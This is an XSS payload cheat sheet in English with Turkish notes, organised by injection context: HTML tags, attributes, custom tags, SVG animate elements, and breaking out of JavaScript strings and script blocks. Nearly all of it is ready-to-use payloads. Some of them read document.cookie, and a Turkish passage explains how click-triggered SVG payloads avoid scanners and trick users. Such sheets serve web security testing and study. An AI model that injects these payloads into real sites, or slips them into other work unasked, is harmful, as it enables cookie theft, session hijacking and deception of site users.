# xss-cheat-sheet

XSS between HTML tags


<script>alert(document.domain)</script>
 <img src=1 onerror=alert(1)>


XSS in HTML tag attributes

"><script>alert(document.domain)</script>

" autofocus onfocus=alert(document.domain) x="

<a href="javascript:alert(document.domain)">

Custom tag
<blog-tag onclick=alert(document.cookie)>
<customtag onmouseover=alert(1)>XSS</customtag>
<customtag autofocus onfocus=alert(1) tabindex=1></customtag>

"><svg><animatetransform onbegin=alert(1)>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>

<!-- Tıklanabilir XSS -->
<svg><a><animate attributeName=href values=javascript:alert(1)></animate><text y=20 x=20>Click</text></a></svg>

<!-- Otomatik tetiklenen -->
<svg><animate attributeName=onload values=alert(1) begin=0s dur=1s></svg>

<!-- CSS injection -->
<svg><animate attributeName=style values="background:url(javascript:alert(1))" dur=1s></svg>

Begin=click’in Güvenlik Açısından Önemi

1.Gizlilik: Kullanıcı tıklayana kadar zararlı kod gizli kalır
2.Bypass: Otomatik güvenlik taramalarını atlatabilir
3.Social Engineering: "Click me" gibi metinlerle kullanıcıyı kandırır
4.Timing Control: Saldırganın istediği anda tetiklenir


Gerçek Örnek
<svg width="200" height="50">
  <a>
    <animate attributeName="href" 
             values="javascript:alert('XSS Executed!')" 
             begin="click" 
             dur="1s"/>
    <text x="10" y="30" fill="blue" style="cursor:pointer">
      Click for surprise! 🎁
    </text>
  </a>
</svg>


XSS in hidden input fields

Look at inside head tags
<link rel="canonical" accesskey="X" onclick="alert(1)" />
(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)


XSS into JavaScript


Terminating the existing script
If there is such a things like that 

<script>
                        var searchTerms = '<script>alert(1)</script>';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>

You could use a payload down below
</script><script>alert(1)</script>





Breaking out of a JavaScript string


If there is something like that

 <script>
                        var searchTerms = 'test123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>

You can use these payloads 
‘-alert(1)-’
'+alert(1)+'
';alert(1);'
';alert(1)//'
'-alert(document.domain)-'
 ';alert(document.domain)//

